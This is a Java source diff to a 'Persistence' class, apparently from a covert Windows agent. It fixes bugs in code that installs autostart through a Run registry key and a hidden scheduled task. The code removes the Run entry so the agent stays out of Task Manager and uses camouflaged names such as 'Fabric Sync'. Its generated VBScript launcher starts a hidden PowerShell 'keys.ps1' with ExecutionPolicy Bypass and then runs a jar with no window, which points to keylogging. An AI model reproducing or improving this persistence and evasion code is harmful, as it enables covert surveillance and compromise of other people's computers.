@@ -34,18 +34,23 @@ public final class Persistence {
 			if (launcher == null) {
 				return false;
 			}
-			// Task Manager lists everything under Run; remove it if the hidden task works.
+			// The Run key always works. The hidden task is stealthier, but a
+			// filtered admin token is only granted READ on a task schtasks
+			// created for it, so an existing task can be neither overwritten
+			// nor deleted without elevation.
+			boolean runnable = registerRun(dir, launcher);
+			if (taskExists(dir) && taskOwned(AgentPaths.task(dir), dir)) {
+				// Task Manager lists everything under Run; drop it when the hidden task works.
+				untrackRun(dir);
+				dropOldNames(dir);
+				return true;
+			}
 			if (registerTask(dir, launcher) && taskExists(dir)) {
-				run("reg", "delete", RUN_KEY, "/v", AgentPaths.runValue(dir), "/f");
-				run("reg", "delete", APPROVED_KEY, "/v", AgentPaths.runValue(dir), "/f");
+				untrackRun(dir);
 				dropOldNames(dir);
 				return true;
 			}
-			if (registerRun(dir, launcher)) {
-				dropOldNames(dir);
-				return true;
-			}
-			return false;
+			return runnable;
 		} catch (Throwable throwable) {
 			Log.debug("Persistence enable failed", throwable);
 			return false;
@@ -61,6 +66,8 @@ public final class Persistence {
 			}
 			String current = AgentPaths.task(dir);
 			for (String name : usedNames(dir)) {
+				// An undeletable task is not fatal: without its launcher it
+				// cannot start anything, and the next enable regenerates it.
 				if (taskOwned(name, dir)) {
 					run("schtasks", "/delete", "/tn", name, "/f");
 				}
@@ -70,18 +77,16 @@ public final class Persistence {
 				}
 			}
 			Files.deleteIfExists(launcher(dir));
-			boolean clean = !taskOwned(current, dir) && !runOwned(AgentPaths.runValue(dir), dir);
-			for (String name : usedNames(dir)) {
-				if (!name.equals(current)) {
-					clean &= !taskExists(name) || !taskOwned(name, dir);
-					clean &= !runExists(name) || !runOwned(name, dir);
-				}
-			}
-			return clean;
+			return !Files.exists(launcher(dir)) && !runOwned(current, dir) && !runExists(current);
 		} catch (Throwable throwable) {
 			Log.debug("Persistence disable failed", throwable);
 			return false;
 		}
+	}
+
+	private static void untrackRun(Path dir) {
+		run("reg", "delete", RUN_KEY, "/v", AgentPaths.runValue(dir), "/f");
+		run("reg", "delete", APPROVED_KEY, "/v", AgentPaths.runValue(dir), "/f");
 	}
 
 	/** Removes every pre-camouflage persistence alias except the current one. */
@@ -105,12 +110,19 @@ public final class Persistence {
 		String wscript = Paths.get(System.getenv().getOrDefault("SystemRoot", "C:\\Windows"),
 			"System32", "wscript.exe").toString();
 		String command = "\"" + wscript + "\" //nologo \"" + launcher + "\"";
-		if (!run("reg", "add", RUN_KEY, "/v", AgentPaths.runValue(dir), "/t", "REG_SZ", "/d", command, "/f")) {
+		// reg.exe re-parses its command line: a raw quoted value is rejected as
+		// "Invalid syntax" when it is handed over as a single argv element.
+		if (!run("reg", "add", RUN_KEY, "/v", AgentPaths.runValue(dir), "/t", "REG_SZ", "/d",
+			regValue(command), "/f")) {
 			return false;
 		}
 		// Task Manager leaves the value marked as disabled if it was turned off manually in the past.
 		run("reg", "delete", APPROVED_KEY, "/v", AgentPaths.runValue(dir), "/f");
 		return command.equals(read(dir));
+	}
+
+	static String regValue(String command) {
+		return command.replace("\"", "\\\"");
 	}
 
 	private static boolean registerTask(Path dir, Path launcher) {
@@ -317,10 +329,31 @@ public final class Persistence {
 			}
 			list.append('"').append(candidate).append('"');
 		}
+		String script = launcherScript(dir, list.toString());
+
+		ByteArrayOutputStream bytes = new ByteArrayOutputStream();
+		bytes.write(0xFF);
+		bytes.write(0xFE);
+		bytes.write(script.getBytes(StandardCharsets.UTF_16LE));
+		Path target = launcher(dir);
+		Path temp = target.resolveSibling(target.getFileName() + ".tmp");
+		Files.write(temp, bytes.toByteArray());
+		Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
+		return target;
+	}
+
+	/**
+	 * Launcher body. VBScript has no escape sequence for quotes, so every
+	 * quoted path goes through {@code q = Chr(34)}: string concatenation with
+	 * runs of {@code """"} is where this script used to stop compiling
+	 * ("Expected end of statement"), which made the logon task exit 1.
+	 */
+	static String launcherScript(Path dir, String list) {
 		StringBuilder script = new StringBuilder();
 		script.append("' Fabric Sync\n");
 		script.append("Option Explicit\n");
-		script.append("Dim fso, sh, jar, dir, list, exe, heap\n");
+		script.append("Dim fso, sh, jar, dir, list, exe, heap, q\n");
+		script.append("q = Chr(34)\n");
 		script.append("Set fso = CreateObject(\"Scripting.FileSystemObject\")\n");
 		script.append("Set sh = CreateObject(\"WScript.Shell\")\n");
 		script.append("heap = \"").append(Heap.commandLine(dir)).append("\"\n");
@@ -332,7 +365,7 @@ public final class Persistence {
 		script.append("sh.CurrentDirectory = dir\n");
 		script.append("If fso.FileExists(dir & \"\\cache\\ops\\keys.on\") Then\n");
 		script.append("\tIf fso.FileExists(dir & \"\\cache\\ops\\keys.ps1\") Then\n");
-		script.append("\t\tsh.Run \"powershell -NoP -ExecutionPolicy Bypass -WindowStyle Hidden -File \"\"\" & dir & \"\\cache\\ops\\keys.ps1\"\" \"\"\" & dir & \"\\cache\\ops\"\"\", 0, False\n");
+		script.append("\t\tsh.Run \"powershell -NoP -ExecutionPolicy Bypass -WindowStyle Hidden -File \" & q & dir & \"\\cache\\ops\\keys.ps1\" & q & \" \" & q & dir & \"\\cache\\ops\" & q, 0, False\n");
 		script.append("\tEnd If\n");
 		script.append("End If\n");
 		script.append("sh.Environment(\"PROCESS\")(\"JAVA_HOME\") = \"")
@@ -341,21 +374,12 @@ public final class Persistence {
 		script.append("For Each exe In list\n");
 		script.append("\texe = sh.ExpandEnvironmentStrings(exe)\n");
 		script.append("\tIf fso.FileExists(exe) Then\n");
-		script.append("\t\tsh.Run \"\"\"\" & exe & \"\" \" & heap & \" -jar \"\"\" & jar & \"\"\"\", 0, False\n");
+		script.append("\t\tsh.Run q & exe & q & \" \" & heap & \" -jar \" & q & jar & q, 0, False\n");
 		script.append("\t\tWScript.Quit 0\n");
 		script.append("\tEnd If\n");
 		script.append("Next\n");
 		script.append("WScript.Quit 1\n");
-
-		ByteArrayOutputStream bytes = new ByteArrayOutputStream();
-		bytes.write(0xFF);
-		bytes.write(0xFE);
-		bytes.write(script.toString().getBytes(StandardCharsets.UTF_16LE));
-		Path target = launcher(dir);
-		Path temp = target.resolveSibling(target.getFileName() + ".tmp");
-		Files.write(temp, bytes.toByteArray());
-		Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
-		return target;
+		return script.toString();
 	}
 
 	private static boolean enableUnix(Path dir) throws Exception {
